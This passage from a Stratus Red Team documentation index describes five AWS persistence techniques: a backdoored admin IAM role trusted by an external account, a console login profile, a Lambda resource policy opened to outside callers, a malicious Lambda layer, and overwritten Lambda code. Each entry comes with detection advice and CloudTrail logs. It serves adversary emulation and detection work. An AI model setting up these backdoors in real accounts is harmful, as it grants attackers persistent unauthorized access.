LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-backdoor-role/","title":"Create a backdoored IAM Role","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-backdoor-role/#mappings","title":"Mappings","text":"<ul> <li> <p>MITRE ATT&amp;CK</p> <ul> <li>Persistence</li> </ul> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Account Manipulation: Additional Cloud Roles (T1098.003)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-backdoor-role/#description","title":"Description","text":"<p>Establishes persistence by creating a new backdoor role with a trust policy allowing it to be assumed from  an external, fictitious attack AWS account.</p> <p>Warm-up: None.</p> <p>Detonation: </p> <ul> <li>Create a new IAM role with the following trust policy:</li> </ul> <pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::193672423079:root\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}\n</code></pre> <ul> <li>Attach the 'AdministratorAccess' managed IAM policy to it. </li> </ul> <p>Note: For safety reasons, the detonation code makes sure that this role has no real effective permissions, by attaching a permissions boundary denying all actions. This could also be achieved with an inline role policy, but using a permissions boundary allows us to use a single API call (CreateRole).</p> <p>References:</p> <ul> <li>https://www.invictus-ir.com/news/the-curious-case-of-dangerdev-protonmail-me</li> <li>https://unit42.paloaltonetworks.com/large-scale-cloud-extortion-operation/</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-backdoor-role/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.iam-create-backdoor-role\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-backdoor-role/#detection","title":"Detection","text":"<ul> <li> <p>Through IAM Access Analyzer,  which generates a finding when a role can be assumed from a new AWS account or publicly.</p> </li> <li> <p>Identify a call to <code>CreateRole</code> closely followed by <code>AttachRolePolicy</code> with an administrator policy.</p> </li> <li> <p>Identify a call to <code>CreateRole</code> that contains an assumeRolePolicyDocument in the requestParameters that allows access from an external AWS account. Sample event:</p> </li> </ul> <pre><code>{\n  \"eventSource\": \"iam.amazonaws.com\",\n  \"eventName\": \"CreateRole\",\n  \"requestParameters\": {\n    \"roleName\": \"malicious-iam-role\",\n    \"assumeRolePolicyDocument\": \"{\\n  \\\"Version\\\": \\\"2012-10-17\\\",\\n  \\\"Statement\\\": [\\n    {\\n      \\\"Effect\\\": \\\"Allow\\\",\\n      \\\"Principal\\\": {\\n        \\\"Service\\\": \\\"ec2.amazonaws.com\\\"\\n      },\\n      \\\"Action\\\": \\\"sts:AssumeRole\\\"\\n    },\\n    {\\n      \\\"Effect\\\": \\\"Allow\\\",\\n      \\\"Principal\\\": {\\n        \\\"AWS\\\": \\\"arn:aws:iam::193672423079:root\\\"\\n      },\\n      \\\"Action\\\": \\\"sts:AssumeRole\\\"\\n    }\\n  ]\\n}\"\n   }\n}\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-backdoor-role/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li> <p><code>iam:AttachRolePolicy</code></p> </li> <li> <p><code>iam:CreateRole</code></p> </li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"sagov-west-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"39480357-0a1d-4531-a3f2-71be4c041c25\",\n      \"eventName\": \"AttachRolePolicy\",\n      \"eventSource\": \"iam.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T13:37:41Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"609418236337\",\n      \"requestID\": \"09b3fc1c-c0c0-4e86-9bad-e0928a089e0d\",\n      \"requestParameters\": {\n         \"policyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\",\n         \"roleName\": \"stratus-red-team-malicious-iam-role\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"209.209.254.254\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"iam.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e2808a95-acc5-4508-b083-d31d6f4315d9\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA0W5KI69TY8X86BGT\",\n         \"accountId\": \"609418236337\",\n         \"arn\": \"arn:aws:iam::609418236337:user/christophe\",\n         \"principalId\": \"AIDAK4TRC24VBN0JX8JX\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-west-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"d2905ac3-9898-433f-b10d-9302abe4e208\",\n      \"eventName\": \"CreateRole\",\n      \"eventSource\": \"iam.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T13:37:41Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"609418236337\",\n      \"requestID\": \"105d4d57-6f6d-43ce-b6a4-5b67c68b4ab5\",\n      \"requestParameters\": {\n         \"assumeRolePolicyDocument\": \"{\\n  \\\"Version\\\": \\\"2012-10-17\\\",\\n  \\\"Statement\\\": [\\n    {\\n      \\\"Effect\\\": \\\"Allow\\\",\\n      \\\"Principal\\\": {\\n        \\\"AWS\\\": \\\"arn:aws:iam::193672423079:root\\\"\\n      },\\n      \\\"Action\\\": \\\"sts:AssumeRole\\\"\\n    }\\n  ]\\n}\",\n         \"permissionsBoundary\": \"arn:aws:iam::aws:policy/AWSDenyAll\",\n         \"roleName\": \"stratus-red-team-malicious-iam-role\"\n      },\n      \"responseElements\": {\n         \"role\": {\n            \"arn\": \"arn:aws:iam::609418236337:role/stratus-red-team-malicious-iam-role\",\n            \"assumeRolePolicyDocument\": \"%7B%0A%20%20%22Version%22%3A%20%222012-10-17%22%2C%0A%20%20%22Statement%22%3A%20%5B%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%22Effect%22%3A%20%22Allow%22%2C%0A%20%20%20%20%20%20%22Principal%22%3A%20%7B%0A%20%20%20%20%20%20%20%20%22AWS%22%3A%20%22arn%3Aaws%3Aiam%3A%3A193672423079%3Aroot%22%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%22Action%22%3A%20%22sts%3AAssumeRole%22%0A%20%20%20%20%7D%0A%20%20%5D%0A%7D\",\n            \"createDate\": \"Aug 1, 2024 1:37:41 PM\",\n            \"path\": \"/\",\n            \"permissionsBoundary\": {\n               \"permissionsBoundaryArn\": \"arn:aws:iam::aws:policy/AWSDenyAll\",\n               \"permissionsBoundaryType\": \"Policy\"\n            },\n            \"roleId\": \"AROA53G8Z8NGXMJ597G3E\",\n            \"roleName\": \"stratus-red-team-malicious-iam-role\"\n         }\n      },\n      \"sourceIPAddress\": \"209.209.254.254\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"iam.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_e2808a95-acc5-4508-b083-d31d6f4315d9\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA0W5KI69TY8X86BGT\",\n         \"accountId\": \"609418236337\",\n         \"arn\": \"arn:aws:iam::609418236337:user/christophe\",\n         \"principalId\": \"AIDAK4TRC24VBN0JX8JX\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-user-login-profile/","title":"Create a Login Profile on an IAM User","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-user-login-profile/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> <li> <p>Privilege Escalation</p> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Account Manipulation: Additional Cloud Credentials (T1098.001)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-user-login-profile/#description","title":"Description","text":"<p>Establishes persistence by creating a Login Profile on an existing IAM user. This allows an attacker to access an IAM user intended to be used programmatically through the AWS console usual login process. </p> <p>Warm-up:</p> <ul> <li>Create an IAM user</li> </ul> <p>Detonation: </p> <ul> <li>Create an IAM Login Profile on the user</li> </ul> <p>References:</p> <ul> <li>https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-ecs-crypto-mining/</li> <li>https://permiso.io/blog/s/approach-to-detection-androxgh0st-greenbot-persistence/</li> <li>https://permiso.io/blog/s/unmasking-guivil-new-cloud-threat-actor/</li> <li>https://blog.darklab.hk/2021/07/06/trouble-in-paradise/</li> <li>https://expel.com/blog/incident-report-from-cli-to-console-chasing-an-attacker-in-aws/</li> <li>https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-user-login-profile/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.iam-create-user-login-profile\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-user-login-profile/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>CreateLoginProfile</code> or <code>UpdateLoginProfile</code> events.</p> <p>In particular, it's suspicious when these events occur on IAM users intended to be used programmatically.</p>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-user-login-profile/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li> <p><code>iam:CreateLoginProfile</code></p> </li> <li> <p><code>iam:DeleteLoginProfile</code></p> </li> <li> <p><code>sts:GetCallerIdentity</code></p> </li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"ap-central-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"e544d47e-6d75-45cf-a8a9-7e90d5f7d38d\",\n      \"eventName\": \"GetCallerIdentity\",\n      \"eventSource\": \"sts.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T13:42:21Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"070411556318\",\n      \"requestID\": \"8a4782c5-408f-4ff4-be0b-6e10202f385f\",\n      \"requestParameters\": null,\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.234.5.234\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"sts.ap-central-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_99dfa7e5-00d3-40b7-8cfd-b2573ada0eac\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAE18PGYHCY2CYMTFK\",\n         \"accountId\": \"070411556318\",\n         \"arn\": \"arn:aws:iam::070411556318:user/christophe\",\n         \"principalId\": \"AIDAWVCXQ27A1H7FID62\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ap-central-2r\",\n      \"errorCode\": \"EntityTemporarilyUnmodifiableException\",\n      \"errorMessage\": \"Login Profile for User stratus-red-team-login-profile-user cannot be modified while login profile is being created.\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"64fb98c9-cb40-4f9a-b800-6c15e82e9be6\",\n      \"eventName\": \"DeleteLoginProfile\",\n      \"eventSource\": \"iam.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T13:42:22Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"070411556318\",\n      \"requestID\": \"a0953f02-9f5f-408a-8188-427026ef914b\",\n      \"requestParameters\": {\n         \"userName\": \"stratus-red-team-login-profile-user\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.234.5.234\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"iam.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_99dfa7e5-00d3-40b7-8cfd-b2573ada0eac\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAE18PGYHCY2CYMTFK\",\n         \"accountId\": \"070411556318\",\n         \"arn\": \"arn:aws:iam::070411556318:user/christophe\",\n         \"principalId\": \"AIDAWVCXQ27A1H7FID62\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ap-central-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"d3906a7d-604b-407f-acb6-fc425742821e\",\n      \"eventName\": \"CreateLoginProfile\",\n      \"eventSource\": \"iam.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T13:42:21Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"070411556318\",\n      \"requestID\": \"cb603f7a-02cc-4123-9855-658655364408\",\n      \"requestParameters\": {\n         \"passwordResetRequired\": false,\n         \"userName\": \"stratus-red-team-login-profile-user\"\n      },\n      \"responseElements\": {\n         \"loginProfile\": {\n            \"createDate\": \"Aug 1, 2024 1:42:21 PM\",\n            \"passwordResetRequired\": false,\n            \"userName\": \"stratus-red-team-login-profile-user\"\n         }\n      },\n      \"sourceIPAddress\": \"253.234.5.234\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"iam.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_99dfa7e5-00d3-40b7-8cfd-b2573ada0eac\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAE18PGYHCY2CYMTFK\",\n         \"accountId\": \"070411556318\",\n         \"arn\": \"arn:aws:iam::070411556318:user/christophe\",\n         \"principalId\": \"AIDAWVCXQ27A1H7FID62\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-backdoor-function/","title":"Backdoor Lambda Function Through Resource-Based Policy","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-backdoor-function/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-backdoor-function/#description","title":"Description","text":"<p>Establishes persistence by backdooring a lambda function to allow its invocation from an external AWS account.</p> <p>Warm-up: </p> <ul> <li>Create a Lambda function.</li> </ul> <p>Detonation: </p> <ul> <li>Modify the Lambda function resource-base policy to allow lambda:InvokeFunction from an external, fictitious AWS account.</li> </ul> <p>References:</p> <ul> <li>https://unit42.paloaltonetworks.com/large-scale-cloud-extortion-operation/</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-backdoor-function/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.lambda-backdoor-function\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-backdoor-function/#detection","title":"Detection","text":"<ul> <li> <p>Using CloudTrail's <code>AddPermission20150331</code> and <code>AddPermission20150331v2</code> events.</p> </li> <li> <p>Through IAM Access Analyzer, which triggers a finding when permissions are added to a Lambda function making it  public or accessible from another account.</p> </li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-backdoor-function/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>lambda:AddPermission20150331v2</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"ca-centralnorth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"b67a9bba-d9da-4980-bf74-baed881b117d\",\n      \"eventName\": \"AddPermission20150331v2\",\n      \"eventSource\": \"lambda.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T13:47:16Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"880896431042\",\n      \"requestID\": \"c84f1436-60be-4ad8-a6f7-f3c44d47df3a\",\n      \"requestParameters\": {\n         \"action\": \"lambda:InvokeFunction\",\n         \"functionName\": \"stratus-red-team-backdoor-f-func\",\n         \"principal\": \"*\",\n         \"statementId\": \"backdoor\"\n      },\n      \"responseElements\": {\n         \"statement\": \"{\\\"Sid\\\":\\\"backdoor\\\",\\\"Effect\\\":\\\"Allow\\\",\\\"Principal\\\":\\\"*\\\",\\\"Action\\\":\\\"lambda:InvokeFunction\\\",\\\"Resource\\\":\\\"arn:aws:lambda:ca-centralnorth-1r:880896431042:function:stratus-red-team-backdoor-f-func\\\"}\"\n      },\n      \"sourceIPAddress\": \"151.236.251.251\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"lambda.ca-centralnorth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_a5b48423-fe4e-446d-a058-0f2b624cdfb1\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAYALJGCQ7J893JO5I\",\n         \"accountId\": \"880896431042\",\n         \"arn\": \"arn:aws:iam::880896431042:user/christophe\",\n         \"principalId\": \"AIDAC4Q0BJF2SN7BSHFO\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-layer-extension/","title":"Add a Malicious Lambda Extension","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-layer-extension/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> <li>Privilege Escalation</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-layer-extension/#description","title":"Description","text":"<p>Establishes persistence by adding a malicious lambda extension.</p> <p>Warm-up: </p> <ul> <li>Create a Lambda function and a lambda extension (layer).</li> </ul> <p>Detonation: </p> <ul> <li>Add the extension as a layer to the Lambda function.</li> </ul> <p>References:</p> <ul> <li>https://www.clearvector.com/blog/lambda-spy/</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-layer-extension/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.lambda-layer-extension\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-layer-extension/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>UpdateFunctionConfiguration20150331v2</code> event.</p> <p>While matching this event may be impractical and prone to false positives in most environments, the following can help to craft more precise detections:</p> <ul> <li>Identify calls to <code>UpdateFunctionConfiguration20150331v2</code> where the <code>responseElements</code> field contains <code>layer</code>, indicating that the function's layers were modified.</li> <li>Identify calls to <code>UpdateFunctionConfiguration20150331v2</code> where <code>responseElements.layers</code> includes a layer that's from a different AWS account.'</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-layer-extension/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>lambda:UpdateFunctionConfiguration20150331v2</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"eugov-eastcentral-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"da929d96-8e20-475c-a810-973addd64769\",\n      \"eventName\": \"UpdateFunctionConfiguration20150331v2\",\n      \"eventSource\": \"lambda.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:57:20Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"712967571683\",\n      \"requestID\": \"e8dffadf-9660-4d37-805f-b6dd8ac15959\",\n      \"requestParameters\": {\n         \"environment\": {},\n         \"functionName\": \"arn:aws:lambda:eugov-eastcentral-1r:712967571683:function:stratus-red-team-lambda-layer-simpleLambda\",\n         \"layers\": [\n            \"arn:aws:lambda:eugov-eastcentral-1r:712967571683:layer:stratus-red-team-lambda-layer-my-lambda-extension:1\"\n         ]\n      },\n      \"responseElements\": {\n         \"architectures\": [\n            \"x86_64\"\n         ],\n         \"codeSha256\": \"yoqgXJ3G1ROsFXLUfkxIKHbCiKf2eKCiIkxoktNUoNE=\",\n         \"codeSize\": 258,\n         \"description\": \"\",\n         \"environment\": {},\n         \"ephemeralStorage\": {\n            \"size\": 512\n         },\n         \"functionArn\": \"arn:aws:lambda:eugov-eastcentral-1r:712967571683:function:stratus-red-team-lambda-layer-simpleLambda\",\n         \"functionName\": \"stratus-red-team-lambda-layer-simpleLambda\",\n         \"handler\": \"stratus-red-team-lambda-layer-simpleLambda.handler\",\n         \"lastModified\": \"2024-07-30T21:57:15.000+0000\",\n         \"lastUpdateStatus\": \"InProgress\",\n         \"lastUpdateStatusReason\": \"The function is being created.\",\n         \"lastUpdateStatusReasonCode\": \"Creating\",\n         \"layers\": [\n            {\n               \"arn\": \"arn:aws:lambda:eugov-eastcentral-1r:712967571683:layer:stratus-red-team-lambda-layer-my-lambda-extension:1\",\n               \"codeSize\": 2120,\n               \"uncompressedCodeSize\": 2672\n            }\n         ],\n         \"loggingConfig\": {\n            \"logFormat\": \"Text\",\n            \"logGroup\": \"/aws/lambda/stratus-red-team-lambda-layer-simpleLambda\"\n         },\n         \"memorySize\": 128,\n         \"packageType\": \"Zip\",\n         \"revisionId\": \"7e710d48-c7d2-419c-b0bb-2f014bb742d8\",\n         \"role\": \"arn:aws:iam::712967571683:role/stratus-red-team-lambda-layer-lambda-role\",\n         \"runtime\": \"python3.10\",\n         \"runtimeVersionConfig\": {\n            \"runtimeVersionArn\": \"arn:aws:lambda:eugov-eastcentral-1r::runtime:fa339b789ded6e524b73b2ce2d1529eb06258c05ffa71ea5c8283c8dc106fbe3\"\n         },\n         \"snapStart\": {\n            \"applyOn\": \"None\",\n            \"optimizationStatus\": \"Off\"\n         },\n         \"state\": \"Active\",\n         \"timeout\": 20,\n         \"tracingConfig\": {\n            \"mode\": \"PassThrough\"\n         },\n         \"version\": \"$LATEST\"\n      },\n      \"sourceIPAddress\": \"211.219.255.238\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"lambda.eugov-eastcentral-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_cc572e3c-6c82-4c71-82f7-bf38ee5dbb4d\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAUBN5AMJF3I0EG996\",\n         \"accountId\": \"712967571683\",\n         \"arn\": \"arn:aws:iam::712967571683:user/christophe\",\n         \"principalId\": \"AIDACL6MX7XSJHAMTCHM\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-overwrite-code/","title":"Overwrite Lambda Function Code","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-overwrite-code/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-overwrite-code/#description","title":"Description","text":"<p>Establishes persistence by overwriting a Lambda function's code.  A further, more advanced, use-case could be updating the code to exfiltrate the data processed by the Lambda function at runtime.</p> <p>Warm-up: </p> <ul> <li>Create a Lambda function.</li> </ul> <p>Detonation: </p> <ul> <li>Update the Lambda function code.</li> </ul> <p>References:</p> <ul> <li>https://research.splunk.com/cloud/aws_lambda_updatefunctioncode/</li> <li>Expel's AWS security mindmap</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-overwrite-code/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.lambda-overwrite-code\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-overwrite-code/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>UpdateFunctionCode*</code> event, e.g. <code>UpdateFunctionCode20150331v2</code>.</p>"},{"location":"attack-techniques/AWS/aws.persistence.lambda-overwrite-code/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>lambda:UpdateFunctionCode20150331v2</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"ap-westeast-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"4672b74f-2466-4784-b3fb-5b4db904a995\",\n      \"eventName\": \"UpdateFunctionCode20150331v2\",\n      \"eventSource\": \"lambda.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T13:52:02Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"266106314375\",\n      \"requestID\": \"4ae683f5-13be-4305-8267-0d2fc47dd663\",\n      \"requestParameters\": {\n         \"dryRun\": false,\n         \"fullyQualifiedArn\": {\n            \"arnPrefix\": {\n               \"account\": \"266106314375\",\n               \"partition\": \"aws\",\n               \"region\": \"ap-westeast-2r\"\n            },\n            \"functionQualifier\": {},\n            \"relativeId\": {\n               \"functionName\": \"stratus-red-team-olc-func-vayhjqkdav\"\n            }\n         },\n         \"functionName\": \"arn:aws:lambda:ap-westeast-2r:266106314375:function:stratus-red-team-olc-func-vayhjqkdav\",\n         \"publish\": true\n      },\n      \"responseElements\": {\n         \"architectures\": [\n            \"x86_64\"\n         ],\n         \"codeSha256\": \"Pt1c8vVaBygmNtAeSyjlpdy7r8nHRqJAAL++HEGlQkc=\",\n         \"codeSize\": 211,\n         \"description\": \"\",\n         \"environment\": {},\n         \"ephemeralStorage\": {\n            \"size\": 512\n         },\n         \"functionArn\": \"arn:aws:lambda:ap-westeast-2r:266106314375:function:stratus-red-team-olc-func-vayhjqkdav:1\",\n         \"functionName\": \"stratus-red-team-olc-func-vayhjqkdav\",\n         \"handler\": \"lambda.lambda_handler\",\n         \"lastModified\": \"2024-08-01T13:52:02.000+0000\",\n         \"loggingConfig\": {\n            \"logFormat\": \"Text\",\n            \"logGroup\": \"/aws/lambda/stratus-red-team-olc-func-vayhjqkdav\"\n         },\n         \"memorySize\": 128,\n         \"packageType\": \"Zip\",\n         \"revisionId\": \"80497f44-ab61-49ef-b235-4166136e3d10\",\n         \"role\": \"arn:aws:iam::266106314375:role/stratus-red-team-olc-lambda-vayhjqkdav\",\n         \"runtime\": \"python3.9\",\n         \"runtimeVersionConfig\": {\n            \"runtimeVersionArn\": \"arn:aws:lambda:ap-westeast-2r::runtime:be9e7121d3264b1e86158b38dbbb656c23dff979eb481793ee37b9e2b79fda22\"\n         },\n         \"snapStart\": {\n            \"applyOn\": \"None\",\n            \"optimizationStatus\": \"Off\"\n         },\n         \"state\": \"Pending\",\n         \"stateReason\": \"The function is being created.\",\n         \"stateReasonCode\": \"Creating\",\n         \"timeout\": 3,\n         \"tracingConfig\": {\n            \"mode\": \"PassThrough\"\n         },\n         \"version\": \"1\"\n      },\n      \"sourceIPAddress\": \"253.8.50.132\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"lambda.ap-westeast-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_856369f3-2721-42df-974b-3243863d6f55\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAKHYV6FI4F4CJQMDV\",\n         \"accountId\": \"266106314375\",\n         \"arn\": \"arn:aws:iam::266106314375:user/christophe\",\n         \"principalId\": \"AIDAHSKGTD3UIOD3DXXY\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> 